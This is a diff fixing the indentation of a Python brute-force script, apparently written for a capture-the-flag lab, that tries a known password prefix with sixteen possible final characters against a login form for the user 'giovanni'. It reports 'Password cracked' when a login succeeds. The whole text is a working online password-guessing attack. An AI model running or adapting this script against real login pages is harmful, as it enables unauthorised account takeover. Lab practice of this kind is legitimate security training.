@@ -97,12 +97,12 @@ class Teacher:
         self.end_password = ["*", "=", "!", "/", "_", "1", "2", "3", "4", "5", "6", "7", "8", "9", "#", "+"]
 
         for convert_password in self.end_password:
-        plain_password = "Th4C00lTheacha" + convert_password.strip("\n")
-        plain_requests = {"anchor":"", "username":"giovanni", "password":plain_password, "rememberusername":"1"}
+            plain_password = "Th4C00lTheacha" + convert_password.strip("\n")
+            plain_requests = {"anchor":"", "username":"giovanni", "password":plain_password, "rememberusername":"1"}
 
-        req_http = requests.post(self.target_url + self.path_url, data=plain_requests).text
-        if("Invalid login" in "".join(req_http))     :  print("[-] Password not cracked : %s") %(plain_password)
-        if not("Invalid login" in "".join(req_http)) :  print("\n[+] Password cracked with success : %s\n" %(plain_password)), sys.exit(0)
+            req_http = requests.post(self.target_url + self.path_url, data=plain_requests).text
+            if("Invalid login" in "".join(req_http))     :  print("[-] Password not cracked : %s") %(plain_password)
+            if not("Invalid login" in "".join(req_http)) :  print("\n[+] Password cracked with success : %s\n" %(plain_password)), sys.exit(0)
         
 if __name__ == "__main__":
     req = Teacher()
